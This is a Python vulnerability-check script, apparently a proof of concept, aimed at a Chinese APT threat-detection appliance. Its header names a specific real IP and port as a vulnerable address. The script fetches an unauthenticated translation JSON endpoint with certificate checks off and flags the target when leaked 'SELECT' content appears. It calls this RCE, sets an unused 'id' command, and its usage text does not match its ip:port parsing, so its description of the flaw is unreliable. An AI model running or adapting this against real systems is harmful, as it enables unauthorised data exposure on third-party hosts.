#!/usr/bin/python3
# -*- coding：utf-8 -*-
#中安网脉APT高级持续性威胁检测系统
#存在漏洞地址：https://111.39.172.13:5443/

import requests
requests.packages.urllib3.disable_warnings()
import sys,colorama
from colorama import *
init(autoreset=True)

def title():
    print(colorama.Fore.GREEN + '+-------------------------------------------------------------+')
    print(colorama.Fore.GREEN +'+      中安网脉APT高级持续性威胁检测系统                +')
    print(colorama.Fore.GREEN +'+-------------------------------------------------------------+')
    print(colorama.Fore.GREEN +'+ EXP: python3 中安网脉APT高级持续性威胁检测系统.py https://1.1.1.1:8443          +')
    print(colorama.Fore.GREEN +'+-------------------------------------------------------------+')
    print(colorama.Fore.GREEN +'+ 请输入url-格式为:1.1.1.1:8443                          +')

import requests
requests.packages.urllib3.disable_warnings()


def run(ip,port):
    urllist = 'https://{}:{}'.format(ip, port)
    cmdsr = 'id'
    url = urllist+'/atd-translation/i18n.json'
    # 打印风险地址
    print('vuln_url:{}'.format(url))
    try:
        cmdshow = requests.get(url=url,verify=False,timeout=50)
        cmdshowlist =  cmdshow.text
    except:
        print("[-] Target Not 中安网脉APT高级持续性威胁检测系统  Vuln")
        return False
    else:
        if 'SELECT' in cmdshow.text:
            print(colorama.Fore.YELLOW +'------------------------------执行结果----------------------------------\n')
            print(colorama.Fore.RED +'{} '.format(cmdshow.text))
            print(colorama.Fore.YELLOW + '------------------------------------------------------------------------\n')
            return True
        else:
            print(" 中安网脉APT高级持续性威胁检测系统 + RCE isn't exist")
            return False
        

if __name__ == '__main__':
    #print('------------------------------------------------------------------------\n')
    title()
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = int(target.split(':')[1])
    result = run(ip, port)
    # 打印验证结果
    if result:
        print('Exist')
    else:
        print('UnExist')
